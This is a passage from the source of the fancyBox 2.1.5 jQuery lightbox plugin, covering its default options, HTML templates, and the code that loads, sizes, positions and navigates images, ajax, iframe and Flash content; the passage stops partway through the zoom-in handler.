/*!
 * fancyBox - jQuery Plugin
 * version: 2.1.5 (Fri, 14 Jun 2013)
 * requires jQuery v1.6 or later
 *
 * Examples at http://fancyapps.com/fancybox/
 * License: www.fancyapps.com/fancybox/#license
 *
 * Copyright 2012 Janis Skarnelis - janis@fancyapps.com
 *
 */

;(function (window, document, $, undefined) {
	"use strict";

	var H = $("html"),
		W = $(window),
		D = $(document),
		F = $.fancybox = function () {
			F.open.apply( this, arguments );
		},
		IE =  navigator.userAgent.match(/msie/i),
		didUpdate	= null,
		isTouch		= document.createTouch !== undefined,

		isQuery	= function(obj) {
			return obj && obj.hasOwnProperty && obj instanceof $;
		},
		isString = function(str) {
			return str && $.type(str) === "string";
		},
		isPercentage = function(str) {
			return isString(str) && str.indexOf('%') > 0;
		},
		isScrollable = function(el) {
			return (el && !(el.style.overflow && el.style.overflow === 'hidden') && ((el.clientWidth && el.scrollWidth > el.clientWidth) || (el.clientHeight && el.scrollHeight > el.clientHeight)));
		},
		getScalar = function(orig, dim) {
			var value = parseInt(orig, 10) || 0;

			if (dim && isPercentage(orig)) {
				value = F.getViewport()[ dim ] / 100 * value;
			}

			return Math.ceil(value);
		},
		getValue = function(value, dim) {
			return getScalar(value, dim) + 'px';
		};

	$.extend(F, {
		// The current version of fancyBox
		version: '2.1.5',

		defaults: {
			padding : 15,
			margin  : 20,

			width     : 800,
			height    : 600,
			minWidth  : 100,
			minHeight : 100,
			maxWidth  : 9999,
			maxHeight : 9999,
			pixelRatio: 1, // Set to 2 for retina display support

			autoSize   : true,
			autoHeight : false,
			autoWidth  : false,

			autoResize  : true,
			autoCenter  : !isTouch,
			fitToView   : true,
			aspectRatio : false,
			topRatio    : 0.5,
			leftRatio   : 0.5,

			scrolling : 'auto', // 'auto', 'yes' or 'no'
			wrapCSS   : '',

			arrows     : true,
			closeBtn   : true,
			closeClick : false,
			nextClick  : false,
			mouseWheel : true,
			autoPlay   : false,
			playSpeed  : 3000,
			preload    : 3,
			modal      : false,
			loop       : true,

			ajax  : {
				dataType : 'html',
				headers  : { 'X-fancyBox': true }
			},
			iframe : {
				scrolling : 'auto',
				preload   : true
			},
			swf : {
				wmode: 'transparent',
				allowfullscreen   : 'true',
				allowscriptaccess : 'always'
			},

			keys  : {
				next : {
					13 : 'left', // enter
					34 : 'up',   // page down
					39 : 'left', // right arrow
					40 : 'up'    // down arrow
				},
				prev : {
					8  : 'right',  // backspace
					33 : 'down',   // page up
					37 : 'right',  // left arrow
					38 : 'down'    // up arrow
				},
				close  : [27], // escape key
				play   : [32], // space - start/stop slideshow
				toggle : [70]  // letter "f" - toggle fullscreen
			},

			direction : {
				next : 'left',
				prev : 'right'
			},

			scrollOutside  : true,

			// Override some properties
			index   : 0,
			type    : null,
			href    : null,
			content : null,
			title   : null,

			// HTML templates
			tpl: {
				wrap     : '<div class="fancybox-wrap" tabIndex="-1"><div class="fancybox-skin"><div class="fancybox-outer"><div class="fancybox-inner"></div></div></div></div>',
				image    : '<img class="fancybox-image" src="{href}" alt="" />',
				iframe   : '<iframe id="fancybox-frame{rnd}" name="fancybox-frame{rnd}" class="fancybox-iframe" frameborder="0" vspace="0" hspace="0" webkitAllowFullScreen mozallowfullscreen allowFullScreen' + (IE ? ' allowtransparency="true"' : '') + '></iframe>',
				error    : '<p class="fancybox-error">The requested content cannot be loaded.<br/>Please try again later.</p>',
				closeBtn : '<a title="Close" class="fancybox-item fancybox-close" href="javascript:;"></a>',
				next     : '<a title="Next" class="fancybox-nav fancybox-next" href="javascript:;"><span></span></a>',
				prev     : '<a title="Previous" class="fancybox-nav fancybox-prev" href="javascript:;"><span></span></a>',
				loading  : '<div id="fancybox-loading"><div></div></div>'
			},

			// Properties for each animation type
			// Opening fancyBox
			openEffect  : 'fade', // 'elastic', 'fade' or 'none'
			openSpeed   : 250,
			openEasing  : 'swing',
			openOpacity : true,
			openMethod  : 'zoomIn',

			// Closing fancyBox
			closeEffect  : 'fade', // 'elastic', 'fade' or 'none'
			closeSpeed   : 250,
			closeEasing  : 'swing',
			closeOpacity : true,
			closeMethod  : 'zoomOut',

			// Changing next gallery item
			nextEffect : 'elastic', // 'elastic', 'fade' or 'none'
			nextSpeed  : 250,
			nextEasing : 'swing',
			nextMethod : 'changeIn',

			// Changing previous gallery item
			prevEffect : 'elastic', // 'elastic', 'fade' or 'none'
			prevSpeed  : 250,
			prevEasing : 'swing',
			prevMethod : 'changeOut',

			// Enable default helpers
			helpers : {
				overlay : true,
				title   : true
			},

			// Callbacks
			onCancel     : $.noop, // If canceling
			beforeLoad   : $.noop, // Before loading
			afterLoad    : $.noop, // After loading
			beforeShow   : $.noop, // Before changing in current item
			afterShow    : $.noop, // After opening
			beforeChange : $.noop, // Before changing gallery item
			beforeClose  : $.noop, // Before closing
			afterClose   : $.noop  // After closing
		},

		//Current state
		group    : {}, // Selected group
		opts     : {}, // Group options
		previous : null,  // Previous element
		coming   : null,  // Element being loaded
		current  : null,  // Currently loaded element
		isActive : false, // Is activated
		isOpen   : false, // Is currently open
		isOpened : false, // Have been fully opened at least once

		wrap  : null,
		skin  : null,
		outer : null,
		inner : null,

		player : {
			timer    : null,
			isActive : false
		},

		// Loaders
		ajaxLoad   : null,
		imgPreload : null,

		// Some collections
		transitions : {},
		helpers     : {},

		/*
		 *	Static methods
		 */

		open: function (group, opts) {
			if (!group) {
				return;
			}

			if (!$.isPlainObject(opts)) {
				opts = {};
			}

			// Close if already active
			if (false === F.close(true)) {
				return;
			}

			// Normalize group
			if (!$.isArray(group)) {
				group = isQuery(group) ? $(group).get() : [group];
			}

			// Recheck if the type of each element is `object` and set content type (image, ajax, etc)
			$.each(group, function(i, element) {
				var obj = {},
					href,
					title,
					content,
					type,
					rez,
					hrefParts,
					selector;

				if ($.type(element) === "object") {
					// Check if is DOM element
					if (element.nodeType) {
						element = $(element);
					}

					if (isQuery(element)) {
						obj = {
							href    : element.data('fancybox-href') || element.attr('href'),
							title   : $('<div/>').text( element.data('fancybox-title') || element.attr('title') || '' ).html(),
							isDom   : true,
							element : element
						};

						if ($.metadata) {
							$.extend(true, obj, element.metadata());
						}

					} else {
						obj = element;
					}
				}

				href  = opts.href  || obj.href || (isString(element) ? element : null);
				title = opts.title !== undefined ? opts.title : obj.title || '';

				content = opts.content || obj.content;
				type    = content ? 'html' : (opts.type  || obj.type);

				if (!type && obj.isDom) {
					type = element.data('fancybox-type');

					if (!type) {
						rez  = element.prop('class').match(/fancybox\.(\w+)/);
						type = rez ? rez[1] : null;
					}
				}

				if (isString(href)) {
					// Try to guess the content type
					if (!type) {
						if (F.isImage(href)) {
							type = 'image';

						} else if (F.isSWF(href)) {
							type = 'swf';

						} else if (href.charAt(0) === '#') {
							type = 'inline';

						} else if (isString(element)) {
							type    = 'html';
							content = element;
						}
					}

					// Split url into two pieces with source url and content selector, e.g,
					// "/mypage.html #my_id" will load "/mypage.html" and display element having id "my_id"
					if (type === 'ajax') {
						hrefParts = href.split(/\s+/, 2);
						href      = hrefParts.shift();
						selector  = hrefParts.shift();
					}
				}

				if (!content) {
					if (type === 'inline') {
						if (href) {
							content = $( isString(href) ? href.replace(/.*(?=#[^\s]+$)/, '') : href ); //strip for ie7

						} else if (obj.isDom) {
							content = element;
						}

					} else if (type === 'html') {
						content = href;

					} else if (!type && !href && obj.isDom) {
						type    = 'inline';
						content = element;
					}
				}

				$.extend(obj, {
					href     : href,
					type     : type,
					content  : content,
					title    : title,
					selector : selector
				});

				group[ i ] = obj;
			});

			// Extend the defaults
			F.opts = $.extend(true, {}, F.defaults, opts);

			// All options are merged recursive except keys
			if (opts.keys !== undefined) {
				F.opts.keys = opts.keys ? $.extend({}, F.defaults.keys, opts.keys) : false;
			}

			F.group = group;

			return F._start(F.opts.index);
		},

		// Cancel image loading or abort ajax request
		cancel: function () {
			var coming = F.coming;

			if (coming && false === F.trigger('onCancel')) {
				return;
			}

			F.hideLoading();

			if (!coming) {
				return;
			}

			if (F.ajaxLoad) {
				F.ajaxLoad.abort();
			}

			F.ajaxLoad = null;

			if (F.imgPreload) {
				F.imgPreload.onload = F.imgPreload.onerror = null;
			}

			if (coming.wrap) {
				coming.wrap.stop(true, true).trigger('onReset').remove();
			}

			F.coming = null;

			// If the first item has been canceled, then clear everything
			if (!F.current) {
				F._afterZoomOut( coming );
			}
		},

		// Start closing animation if is open; remove immediately if opening/closing
		close: function (event) {
			F.cancel();

			if (false === F.trigger('beforeClose')) {
				return;
			}

			F.unbindEvents();

			if (!F.isActive) {
				return;
			}

			if (!F.isOpen || event === true) {
				$('.fancybox-wrap').stop(true).trigger('onReset').remove();

				F._afterZoomOut();

			} else {
				F.isOpen = F.isOpened = false;
				F.isClosing = true;

				$('.fancybox-item, .fancybox-nav').remove();

				F.wrap.stop(true, true).removeClass('fancybox-opened');

				F.transitions[ F.current.closeMethod ]();
			}
		},

		// Manage slideshow:
		//   $.fancybox.play(); - toggle slideshow
		//   $.fancybox.play( true ); - start
		//   $.fancybox.play( false ); - stop
		play: function ( action ) {
			var clear = function () {
					clearTimeout(F.player.timer);
				},
				set = function () {
					clear();

					if (F.current && F.player.isActive) {
						F.player.timer = setTimeout(F.next, F.current.playSpeed);
					}
				},
				stop = function () {
					clear();

					D.unbind('.player');

					F.player.isActive = false;

					F.trigger('onPlayEnd');
				},
				start = function () {
					if (F.current && (F.current.loop || F.current.index < F.group.length - 1)) {
						F.player.isActive = true;

						D.bind({
							'onCancel.player beforeClose.player' : stop,
							'onUpdate.player'   : set,
							'beforeLoad.player' : clear
						});

						set();

						F.trigger('onPlayStart');
					}
				};

			if (action === true || (!F.player.isActive && action !== false)) {
				start();
			} else {
				stop();
			}
		},

		// Navigate to next gallery item
		next: function ( direction ) {
			var current = F.current;

			if (current) {
				if (!isString(direction)) {
					direction = current.direction.next;
				}

				F.jumpto(current.index + 1, direction, 'next');
			}
		},

		// Navigate to previous gallery item
		prev: function ( direction ) {
			var current = F.current;

			if (current) {
				if (!isString(direction)) {
					direction = current.direction.prev;
				}

				F.jumpto(current.index - 1, direction, 'prev');
			}
		},

		// Navigate to gallery item by index
		jumpto: function ( index, direction, router ) {
			var current = F.current;

			if (!current) {
				return;
			}

			index = getScalar(index);

			F.direction = direction || current.direction[ (index >= current.index ? 'next' : 'prev') ];
			F.router    = router || 'jumpto';

			if (current.loop) {
				if (index < 0) {
					index = current.group.length + (index % current.group.length);
				}

				index = index % current.group.length;
			}

			if (current.group[ index ] !== undefined) {
				F.cancel();

				F._start(index);
			}
		},

		// Center inside viewport and toggle position type to fixed or absolute if needed
		reposition: function (e, onlyAbsolute) {
			var current = F.current,
				wrap    = current ? current.wrap : null,
				pos;

			if (wrap) {
				pos = F._getPosition(onlyAbsolute);

				if (e && e.type === 'scroll') {
					delete pos.position;

					wrap.stop(true, true).animate(pos, 200);

				} else {
					wrap.css(pos);

					current.pos = $.extend({}, current.dim, pos);
				}
			}
		},

		update: function (e) {
			var type = (e && e.originalEvent && e.originalEvent.type),
				anyway = !type || type === 'orientationchange';

			if (anyway) {
				clearTimeout(didUpdate);

				didUpdate = null;
			}

			if (!F.isOpen || didUpdate) {
				return;
			}

			didUpdate = setTimeout(function() {
				var current = F.current;

				if (!current || F.isClosing) {
					return;
				}

				F.wrap.removeClass('fancybox-tmp');

				if (anyway || type === 'load' || (type === 'resize' && current.autoResize)) {
					F._setDimension();
				}

				if (!(type === 'scroll' && current.canShrink)) {
					F.reposition(e);
				}

				F.trigger('onUpdate');

				didUpdate = null;

			}, (anyway && !isTouch ? 0 : 300));
		},

		// Shrink content to fit inside viewport or restore if resized
		toggle: function ( action ) {
			if (F.isOpen) {
				F.current.fitToView = $.type(action) === "boolean" ? action : !F.current.fitToView;

				// Help browser to restore document dimensions
				if (isTouch) {
					F.wrap.removeAttr('style').addClass('fancybox-tmp');

					F.trigger('onUpdate');
				}

				F.update();
			}
		},

		hideLoading: function () {
			D.unbind('.loading');

			$('#fancybox-loading').remove();
		},

		showLoading: function () {
			var el, viewport;

			F.hideLoading();

			el = $(F.opts.tpl.loading).click(F.cancel).appendTo('body');

			// If user will press the escape-button, the request will be canceled
			D.bind('keydown.loading', function(e) {
				if ((e.which || e.keyCode) === 27) {
					e.preventDefault();

					F.cancel();
				}
			});

			if (!F.defaults.fixed) {
				viewport = F.getViewport();

				el.css({
					position : 'absolute',
					top  : (viewport.h * 0.5) + viewport.y,
					left : (viewport.w * 0.5) + viewport.x
				});
			}

			F.trigger('onLoading');
		},

		getViewport: function () {
			var locked = (F.current && F.current.locked) || false,
				rez    = {
					x: W.scrollLeft(),
					y: W.scrollTop()
				};

			if (locked && locked.length) {
				rez.w = locked[0].clientWidth;
				rez.h = locked[0].clientHeight;

			} else {
				// See http://bugs.jquery.com/ticket/6724
				rez.w = isTouch && window.innerWidth  ? window.innerWidth  : W.width();
				rez.h = isTouch && window.innerHeight ? window.innerHeight : W.height();
			}

			return rez;
		},

		// Unbind the keyboard / clicking actions
		unbindEvents: function () {
			if (F.wrap && isQuery(F.wrap)) {
				F.wrap.unbind('.fb');
			}

			D.unbind('.fb');
			W.unbind('.fb');
		},

		bindEvents: function () {
			var current = F.current,
				keys;

			if (!current) {
				return;
			}

			// Changing document height on iOS devices triggers a 'resize' event,
			// that can change document height... repeating infinitely
			W.bind('orientationchange.fb' + (isTouch ? '' : ' resize.fb') + (current.autoCenter && !current.locked ? ' scroll.fb' : ''), F.update);

			keys = current.keys;

			if (keys) {
				D.bind('keydown.fb', function (e) {
					var code   = e.which || e.keyCode,
						target = e.target || e.srcElement;

					// Skip esc key if loading, because showLoading will cancel preloading
					if (code === 27 && F.coming) {
						return false;
					}

					// Ignore key combinations and key events within form elements
					if (!e.ctrlKey && !e.altKey && !e.shiftKey && !e.metaKey && !(target && (target.type || $(target).is('[contenteditable]')))) {
						$.each(keys, function(i, val) {
							if (current.group.length > 1 && val[ code ] !== undefined) {
								F[ i ]( val[ code ] );

								e.preventDefault();
								return false;
							}

							if ($.inArray(code, val) > -1) {
								F[ i ] ();

								e.preventDefault();
								return false;
							}
						});
					}
				});
			}

			if ($.fn.mousewheel && current.mouseWheel) {
				F.wrap.bind('mousewheel.fb', function (e, delta, deltaX, deltaY) {
					var target = e.target || null,
						parent = $(target),
						canScroll = false;

					while (parent.length) {
						if (canScroll || parent.is('.fancybox-skin') || parent.is('.fancybox-wrap')) {
							break;
						}

						canScroll = isScrollable( parent[0] );
						parent    = $(parent).parent();
					}

					if (delta !== 0 && !canScroll) {
						if (F.group.length > 1 && !current.canShrink) {
							if (deltaY > 0 || deltaX > 0) {
								F.prev( deltaY > 0 ? 'down' : 'left' );

							} else if (deltaY < 0 || deltaX < 0) {
								F.next( deltaY < 0 ? 'up' : 'right' );
							}

							e.preventDefault();
						}
					}
				});
			}
		},

		trigger: function (event, o) {
			var ret, obj = o || F.coming || F.current;

			if (obj) {
				if ($.isFunction( obj[event] )) {
					ret = obj[event].apply(obj, Array.prototype.slice.call(arguments, 1));
				}

				if (ret === false) {
					return false;
				}

				if (obj.helpers) {
					$.each(obj.helpers, function (helper, opts) {
						if (opts && F.helpers[helper] && $.isFunction(F.helpers[helper][event])) {
							F.helpers[helper][event]($.extend(true, {}, F.helpers[helper].defaults, opts), obj);
						}
					});
				}
			}

			D.trigger(event);
		},

		isImage: function (str) {
			return isString(str) && str.match(/(^data:image\/.*,)|(\.(jp(e|g|eg)|gif|png|bmp|webp|svg)((\?|#).*)?$)/i);
		},

		isSWF: function (str) {
			return isString(str) && str.match(/\.(swf)((\?|#).*)?$/i);
		},

		_start: function (index) {
			var coming = {},
				obj,
				href,
				type,
				margin,
				padding;

			index = getScalar( index );
			obj   = F.group[ index ] || null;

			if (!obj) {
				return false;
			}

			coming = $.extend(true, {}, F.opts, obj);

			// Convert margin and padding properties to array - top, right, bottom, left
			margin  = coming.margin;
			padding = coming.padding;

			if ($.type(margin) === 'number') {
				coming.margin = [margin, margin, margin, margin];
			}

			if ($.type(padding) === 'number') {
				coming.padding = [padding, padding, padding, padding];
			}

			// 'modal' propery is just a shortcut
			if (coming.modal) {
				$.extend(true, coming, {
					closeBtn   : false,
					closeClick : false,
					nextClick  : false,
					arrows     : false,
					mouseWheel : false,
					keys       : null,
					helpers: {
						overlay : {
							closeClick : false
						}
					}
				});
			}

			// 'autoSize' property is a shortcut, too
			if (coming.autoSize) {
				coming.autoWidth = coming.autoHeight = true;
			}

			if (coming.width === 'auto') {
				coming.autoWidth = true;
			}

			if (coming.height === 'auto') {
				coming.autoHeight = true;
			}

			/*
			 * Add reference to the group, so it`s possible to access from callbacks, example:
			 * afterLoad : function() {
			 *     this.title = 'Image ' + (this.index + 1) + ' of ' + this.group.length + (this.title ? ' - ' + this.title : '');
			 * }
			 */

			coming.group  = F.group;
			coming.index  = index;

			// Give a chance for callback or helpers to update coming item (type, title, etc)
			F.coming = coming;

			if (false === F.trigger('beforeLoad')) {
				F.coming = null;

				return;
			}

			type = coming.type;
			href = coming.href;

			if (!type) {
				F.coming = null;

				//If we can not determine content type then drop silently or display next/prev item if looping through gallery
				if (F.current && F.router && F.router !== 'jumpto') {
					F.current.index = index;

					return F[ F.router ]( F.direction );
				}

				return false;
			}

			F.isActive = true;

			if (type === 'image' || type === 'swf') {
				coming.autoHeight = coming.autoWidth = false;
				coming.scrolling  = 'visible';
			}

			if (type === 'image') {
				coming.aspectRatio = true;
			}

			if (type === 'iframe' && isTouch) {
				coming.scrolling = 'scroll';
			}

			// Build the neccessary markup
			coming.wrap = $(coming.tpl.wrap).addClass('fancybox-' + (isTouch ? 'mobile' : 'desktop') + ' fancybox-type-' + type + ' fancybox-tmp ' + coming.wrapCSS).appendTo( coming.parent || 'body' );

			$.extend(coming, {
				skin  : $('.fancybox-skin',  coming.wrap),
				outer : $('.fancybox-outer', coming.wrap),
				inner : $('.fancybox-inner', coming.wrap)
			});

			$.each(["Top", "Right", "Bottom", "Left"], function(i, v) {
				coming.skin.css('padding' + v, getValue(coming.padding[ i ]));
			});

			F.trigger('onReady');

			// Check before try to load; 'inline' and 'html' types need content, others - href
			if (type === 'inline' || type === 'html') {
				if (!coming.content || !coming.content.length) {
					return F._error( 'content' );
				}

			} else if (!href) {
				return F._error( 'href' );
			}

			if (type === 'image') {
				F._loadImage();

			} else if (type === 'ajax') {
				F._loadAjax();

			} else if (type === 'iframe') {
				F._loadIframe();

			} else {
				F._afterLoad();
			}
		},

		_error: function ( type ) {
			$.extend(F.coming, {
				type       : 'html',
				autoWidth  : true,
				autoHeight : true,
				minWidth   : 0,
				minHeight  : 0,
				scrolling  : 'no',
				hasError   : type,
				content    : F.coming.tpl.error
			});

			F._afterLoad();
		},

		_loadImage: function () {
			// Reset preload image so it is later possible to check "complete" property
			var img = F.imgPreload = new Image();

			img.onload = function () {
				this.onload = this.onerror = null;

				F.coming.width  = this.width / F.opts.pixelRatio;
				F.coming.height = this.height / F.opts.pixelRatio;

				F._afterLoad();
			};

			img.onerror = function () {
				this.onload = this.onerror = null;

				F._error( 'image' );
			};

			img.src = F.coming.href;

			if (img.complete !== true) {
				F.showLoading();
			}
		},

		_loadAjax: function () {
			var coming = F.coming;

			F.showLoading();

			F.ajaxLoad = $.ajax($.extend({}, coming.ajax, {
				url: coming.href,
				error: function (jqXHR, textStatus) {
					if (F.coming && textStatus !== 'abort') {
						F._error( 'ajax', jqXHR );

					} else {
						F.hideLoading();
					}
				},
				success: function (data, textStatus) {
					if (textStatus === 'success') {
						coming.content = data;

						F._afterLoad();
					}
				}
			}));
		},

		_loadIframe: function() {
			var coming = F.coming,
				iframe = $(coming.tpl.iframe.replace(/\{rnd\}/g, new Date().getTime()))
					.attr('scrolling', isTouch ? 'auto' : coming.iframe.scrolling)
					.attr('src', coming.href);

			// This helps IE
			$(coming.wrap).bind('onReset', function () {
				try {
					$(this).find('iframe').hide().attr('src', '//about:blank').end().empty();
				} catch (e) {}
			});

			if (coming.iframe.preload) {
				F.showLoading();

				iframe.one('load', function() {
					$(this).data('ready', 1);

					// iOS will lose scrolling if we resize
					if (!isTouch) {
						$(this).bind('load.fb', F.update);
					}

					// Without this trick:
					//   - iframe won't scroll on iOS devices
					//   - IE7 sometimes displays empty iframe
					$(this).parents('.fancybox-wrap').width('100%').removeClass('fancybox-tmp').show();

					F._afterLoad();
				});
			}

			coming.content = iframe.appendTo( coming.inner );

			if (!coming.iframe.preload) {
				F._afterLoad();
			}
		},

		_preloadImages: function() {
			var group   = F.group,
				current = F.current,
				len     = group.length,
				cnt     = current.preload ? Math.min(current.preload, len - 1) : 0,
				item,
				i;

			for (i = 1; i <= cnt; i += 1) {
				item = group[ (current.index + i ) % len ];

				if (item.type === 'image' && item.href) {
					new Image().src = item.href;
				}
			}
		},

		_afterLoad: function () {
			var coming   = F.coming,
				previous = F.current,
				placeholder = 'fancybox-placeholder',
				current,
				content,
				type,
				scrolling,
				href,
				embed;

			F.hideLoading();

			if (!coming || F.isActive === false) {
				return;
			}

			if (false === F.trigger('afterLoad', coming, previous)) {
				coming.wrap.stop(true).trigger('onReset').remove();

				F.coming = null;

				return;
			}

			if (previous) {
				F.trigger('beforeChange', previous);

				previous.wrap.stop(true).removeClass('fancybox-opened')
					.find('.fancybox-item, .fancybox-nav')
					.remove();
			}

			F.unbindEvents();

			current   = coming;
			content   = coming.content;
			type      = coming.type;
			scrolling = coming.scrolling;

			$.extend(F, {
				wrap  : current.wrap,
				skin  : current.skin,
				outer : current.outer,
				inner : current.inner,
				current  : current,
				previous : previous
			});

			href = current.href;

			switch (type) {
				case 'inline':
				case 'ajax':
				case 'html':
					if (current.selector) {
						content = $('<div>').html(content).find(current.selector);

					} else if (isQuery(content)) {
						if (!content.data(placeholder)) {
							content.data(placeholder, $('<div class="' + placeholder + '"></div>').insertAfter( content ).hide() );
						}

						content = content.show().detach();

						current.wrap.bind('onReset', function () {
							if ($(this).find(content).length) {
								content.hide().replaceAll( content.data(placeholder) ).data(placeholder, false);
							}
						});
					}
				break;

				case 'image':
					content = current.tpl.image.replace(/\{href\}/g, href);
				break;

				case 'swf':
					content = '<object id="fancybox-swf" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="100%" height="100%"><param name="movie" value="' + href + '"></param>';
					embed   = '';

					$.each(current.swf, function(name, val) {
						content += '<param name="' + name + '" value="' + val + '"></param>';
						embed   += ' ' + name + '="' + val + '"';
					});

					content += '<embed src="' + href + '" type="application/x-shockwave-flash" width="100%" height="100%"' + embed + '></embed></object>';
				break;
			}

			if (!(isQuery(content) && content.parent().is(current.inner))) {
				current.inner.append( content );
			}

			// Give a chance for helpers or callbacks to update elements
			F.trigger('beforeShow');

			// Set scrolling before calculating dimensions
			current.inner.css('overflow', scrolling === 'yes' ? 'scroll' : (scrolling === 'no' ? 'hidden' : scrolling));

			// Set initial dimensions and start position
			F._setDimension();

			F.reposition();

			F.isOpen = false;
			F.coming = null;

			F.bindEvents();

			if (!F.isOpened) {
				$('.fancybox-wrap').not( current.wrap ).stop(true).trigger('onReset').remove();

			} else if (previous.prevMethod) {
				F.transitions[ previous.prevMethod ]();
			}

			F.transitions[ F.isOpened ? current.nextMethod : current.openMethod ]();

			F._preloadImages();
		},

		_setDimension: function () {
			var viewport   = F.getViewport(),
				steps      = 0,
				canShrink  = false,
				canExpand  = false,
				wrap       = F.wrap,
				skin       = F.skin,
				inner      = F.inner,
				current    = F.current,
				width      = current.width,
				height     = current.height,
				minWidth   = current.minWidth,
				minHeight  = current.minHeight,
				maxWidth   = current.maxWidth,
				maxHeight  = current.maxHeight,
				scrolling  = current.scrolling,
				scrollOut  = current.scrollOutside ? current.scrollbarWidth : 0,
				margin     = current.margin,
				wMargin    = getScalar(margin[1] + margin[3]),
				hMargin    = getScalar(margin[0] + margin[2]),
				wPadding,
				hPadding,
				wSpace,
				hSpace,
				origWidth,
				origHeight,
				origMaxWidth,
				origMaxHeight,
				ratio,
				width_,
				height_,
				maxWidth_,
				maxHeight_,
				iframe,
				body;

			// Reset dimensions so we could re-check actual size
			wrap.add(skin).add(inner).width('auto').height('auto').removeClass('fancybox-tmp');

			wPadding = getScalar(skin.outerWidth(true)  - skin.width());
			hPadding = getScalar(skin.outerHeight(true) - skin.height());

			// Any space between content and viewport (margin, padding, border, title)
			wSpace = wMargin + wPadding;
			hSpace = hMargin + hPadding;

			origWidth  = isPercentage(width)  ? (viewport.w - wSpace) * getScalar(width)  / 100 : width;
			origHeight = isPercentage(height) ? (viewport.h - hSpace) * getScalar(height) / 100 : height;

			if (current.type === 'iframe') {
				iframe = current.content;

				if (current.autoHeight && iframe.data('ready') === 1) {
					try {
						if (iframe[0].contentWindow.document.location) {
							inner.width( origWidth ).height(9999);

							body = iframe.contents().find('body');

							if (scrollOut) {
								body.css('overflow-x', 'hidden');
							}

							origHeight = body.outerHeight(true);
						}

					} catch (e) {}
				}

			} else if (current.autoWidth || current.autoHeight) {
				inner.addClass( 'fancybox-tmp' );

				// Set width or height in case we need to calculate only one dimension
				if (!current.autoWidth) {
					inner.width( origWidth );
				}

				if (!current.autoHeight) {
					inner.height( origHeight );
				}

				if (current.autoWidth) {
					origWidth = inner.width();
				}

				if (current.autoHeight) {
					origHeight = inner.height();
				}

				inner.removeClass( 'fancybox-tmp' );
			}

			width  = getScalar( origWidth );
			height = getScalar( origHeight );

			ratio  = origWidth / origHeight;

			// Calculations for the content
			minWidth  = getScalar(isPercentage(minWidth) ? getScalar(minWidth, 'w') - wSpace : minWidth);
			maxWidth  = getScalar(isPercentage(maxWidth) ? getScalar(maxWidth, 'w') - wSpace : maxWidth);

			minHeight = getScalar(isPercentage(minHeight) ? getScalar(minHeight, 'h') - hSpace : minHeight);
			maxHeight = getScalar(isPercentage(maxHeight) ? getScalar(maxHeight, 'h') - hSpace : maxHeight);

			// These will be used to determine if wrap can fit in the viewport
			origMaxWidth  = maxWidth;
			origMaxHeight = maxHeight;

			if (current.fitToView) {
				maxWidth  = Math.min(viewport.w - wSpace, maxWidth);
				maxHeight = Math.min(viewport.h - hSpace, maxHeight);
			}

			maxWidth_  = viewport.w - wMargin;
			maxHeight_ = viewport.h - hMargin;

			if (current.aspectRatio) {
				if (width > maxWidth) {
					width  = maxWidth;
					height = getScalar(width / ratio);
				}

				if (height > maxHeight) {
					height = maxHeight;
					width  = getScalar(height * ratio);
				}

				if (width < minWidth) {
					width  = minWidth;
					height = getScalar(width / ratio);
				}

				if (height < minHeight) {
					height = minHeight;
					width  = getScalar(height * ratio);
				}

			} else {
				width = Math.max(minWidth, Math.min(width, maxWidth));

				if (current.autoHeight && current.type !== 'iframe') {
					inner.width( width );

					height = inner.height();
				}

				height = Math.max(minHeight, Math.min(height, maxHeight));
			}

			// Try to fit inside viewport (including the title)
			if (current.fitToView) {
				inner.width( width ).height( height );

				wrap.width( width + wPadding );

				// Real wrap dimensions
				width_  = wrap.width();
				height_ = wrap.height();

				if (current.aspectRatio) {
					while ((width_ > maxWidth_ || height_ > maxHeight_) && width > minWidth && height > minHeight) {
						if (steps++ > 19) {
							break;
						}

						height = Math.max(minHeight, Math.min(maxHeight, height - 10));
						width  = getScalar(height * ratio);

						if (width < minWidth) {
							width  = minWidth;
							height = getScalar(width / ratio);
						}

						if (width > maxWidth) {
							width  = maxWidth;
							height = getScalar(width / ratio);
						}

						inner.width( width ).height( height );

						wrap.width( width + wPadding );

						width_  = wrap.width();
						height_ = wrap.height();
					}

				} else {
					width  = Math.max(minWidth,  Math.min(width,  width  - (width_  - maxWidth_)));
					height = Math.max(minHeight, Math.min(height, height - (height_ - maxHeight_)));
				}
			}

			if (scrollOut && scrolling === 'auto' && height < origHeight && (width + wPadding + scrollOut) < maxWidth_) {
				width += scrollOut;
			}

			inner.width( width ).height( height );

			wrap.width( width + wPadding );

			width_  = wrap.width();
			height_ = wrap.height();

			canShrink = (width_ > maxWidth_ || height_ > maxHeight_) && width > minWidth && height > minHeight;
			canExpand = current.aspectRatio ? (width < origMaxWidth && height < origMaxHeight && width < origWidth && height < origHeight) : ((width < origMaxWidth || height < origMaxHeight) && (width < origWidth || height < origHeight));

			$.extend(current, {
				dim : {
					width	: getValue( width_ ),
					height	: getValue( height_ )
				},
				origWidth  : origWidth,
				origHeight : origHeight,
				canShrink  : canShrink,
				canExpand  : canExpand,
				wPadding   : wPadding,
				hPadding   : hPadding,
				wrapSpace  : height_ - skin.outerHeight(true),
				skinSpace  : skin.height() - height
			});

			if (!iframe && current.autoHeight && height > minHeight && height < maxHeight && !canExpand) {
				inner.height('auto');
			}
		},

		_getPosition: function (onlyAbsolute) {
			var current  = F.current,
				viewport = F.getViewport(),
				margin   = current.margin,
				width    = F.wrap.width()  + margin[1] + margin[3],
				height   = F.wrap.height() + margin[0] + margin[2],
				rez      = {
					position: 'absolute',
					top  : margin[0],
					left : margin[3]
				};

			if (current.autoCenter && current.fixed && !onlyAbsolute && height <= viewport.h && width <= viewport.w) {
				rez.position = 'fixed';

			} else if (!current.locked) {
				rez.top  += viewport.y;
				rez.left += viewport.x;
			}

			rez.top  = getValue(Math.max(rez.top,  rez.top  + ((viewport.h - height) * current.topRatio)));
			rez.left = getValue(Math.max(rez.left, rez.left + ((viewport.w - width)  * current.leftRatio)));

			return rez;
		},

		_afterZoomIn: function () {
			var current = F.current;

			if (!current) {
				return;
			}

			F.isOpen = F.isOpened = true;

			F.wrap.css('overflow', 'visible').addClass('fancybox-opened').hide().show(0);

			F.update();

			// Assign a click event
			if ( current.closeClick || (current.nextClick && F.group.length > 1) ) {
				F.inner.css('cursor', 'pointer').bind('click.fb', function(e) {
					if (!$(e.target).is('a') && !$(e.target).parent().is('a')) {
						e.preventDefault();

						F[ current.closeClick ? 'close' : 'next' ]();
					}
				});
			}

			// Create a close button
			if (current.closeBtn) {
